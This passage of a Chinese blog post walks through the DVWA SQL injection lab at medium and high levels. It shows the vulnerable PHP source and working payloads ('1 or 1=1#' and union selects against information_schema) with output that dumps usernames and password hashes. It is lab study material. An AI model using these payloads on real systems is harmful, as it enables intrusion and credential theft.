+<h2 id="Level：medium"><a href="#Level：medium" class="headerlink" title="Level：medium"></a>Level：medium</h2><h3 id="View-Source-1"><a href="#View-Source-1" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id"</span>;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于low等级，medium只多了一条语句：<code>$id = mysql_real_escape_string($id);</code>，很显然该题设置了一些过滤。<br>mysql_real_escape_string()函数：转义 SQL 语句字符串中的特殊字符，如输入单引号<code>&#39;</code>则处理时会在其前面加上反斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">\x00</td>
+<td style="text-align:center">空字符（null）</td>
+</tr>
+<tr>
+<td style="text-align:center">\n</td>
+<td style="text-align:center">换行</td>
+</tr>
+<tr>
+<td style="text-align:center">\r</td>
+<td style="text-align:center">回车</td>
+</tr>
+<tr>
+<td style="text-align:center">\</td>
+<td style="text-align:center">反斜杠</td>
+</tr>
+<tr>
+<td style="text-align:center">‘</td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">‘’</td>
+<td style="text-align:center">双引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\x1a</td>
+<td style="text-align:center">代替（substitute）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="判断注入点及类型-1"><a href="#判断注入点及类型-1" class="headerlink" title="判断注入点及类型"></a>判断注入点及类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' or 1=1#</span></span><br><span class="line"> You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">'\' or 1=1#'</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1 or 1=1#</span></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line">可以判断出这题是数字型注入，所以对单引号，双引号的过滤并没有多大影响。</span><br></pre></td></tr></table></figure>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>同样的方法，order by 或者 union select</p>
+<h3 id="union注入-1"><a href="#union注入-1" class="headerlink" title="union注入"></a>union注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴库</span></span><br><span class="line"> 输入：1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴表</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: guestbook</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暴字段</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: user_id</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: first_name</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: last_name</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: avatar</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴数据</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: gordonb</span><br><span class="line"> Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1337</span></span><br><span class="line"> Surname: <span class="number">8</span>d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: pablo</span><br><span class="line"> Surname: <span class="number">0</span>d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: smithy</span><br><span class="line"> Surname: <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure>
+<h2 id="Level：high"><a href="#Level：high" class="headerlink" title="Level：high"></a>Level：high</h2><h3 id="View-Source-2"><a href="#View-Source-2" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">        $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">            $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于 medium ，high 多了一条语句：<code>$id = stripslashes($id);</code>，还有一个if语句。    </p>
+<ol>
+<li><p>stripslashes()函数：反引用一个字符串，返回一个去除转义反斜线后的字符串（\‘ 转换为 ‘ 等等）。双反斜线（\\）被转换为单个反斜线（\）。   </p>
+</li>
+<li><p>is_numeric()函数：检测变量是否为数字或数字字符串，是则返回 TRUE，否则返回 FALSE。   </p>
+</li>
+</ol>
+<p>这题太狠了，输入的只能是数字或数字字符串，还过滤了转义，绝了，不会！</p>
+<h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">or</span> <span class="string">'12'</span> = <span class="string">'12'</span>;</span><br><span class="line"><span class="comment">#当or之后的内容为true时会爆出表中的所有数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">or</span> <span class="string">'12'</span> = <span class="string">'1'</span>;</span><br><span class="line"><span class="comment">#当or之后的内容为false时会爆出表中id = 1的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'12'</span> = <span class="string">'12'</span>;</span><br><span class="line"><span class="comment">#当and之后的内容为true时会爆出表中id = 1的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'12'</span> = <span class="string">'1'</span>;</span><br><span class="line"><span class="comment">#当and之后的内容为false时则不会爆出数据</span></span><br></pre></td></tr></table></figure>
+<p>后面三点都比较好懂，我疑惑的是第一点为什么会爆出所有数据？希望有师父指点。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/23/数组返回NULL绕过/" rel="next" title="数组返回NULL绕过">
+                <i class="fa fa-chevron-left"></i> 数组返回NULL绕过
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/常用SQL语句/" rel="prev" title="常用SQL语句">
+                常用SQL语句 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/kawhi.jpg" alt="kawhi">
+            
+              <p class="site-author-name" itemprop="name">kawhi</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Intro"><span class="nav-number">1.</span> <span class="nav-text">Intro</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level：low"><span class="nav-number">2.</span> <span class="nav-text">Level：low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#View-Source"><span class="nav-number">2.1.</span> <span class="nav-text">View Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入点及类型"><span class="nav-number">2.2.</span> <span class="nav-text">判断注入点及类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜测所查表中的字段数"><span class="nav-number">2.3.</span> <span class="nav-text">猜测所查表中的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union注入"><span class="nav-number">2.4.</span> <span class="nav-text">union注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level：medium"><span class="nav-number">3.</span> <span class="nav-text">Level：medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#View-Source-1"><span class="nav-number">3.1.</span> <span class="nav-text">View Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入点及类型-1"><span class="nav-number">3.2.</span> <span class="nav-text">判断注入点及类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断字段数"><span class="nav-number">3.3.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union注入-1"><span class="nav-number">3.4.</span> <span class="nav-text">union注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level：high"><span class="nav-number">4.</span> <span class="nav-text">Level：high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#View-Source-2"><span class="nav-number">4.1.</span> <span class="nav-text">View Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question"><span class="nav-number">5.</span> <span class="nav-text">question</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.5.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
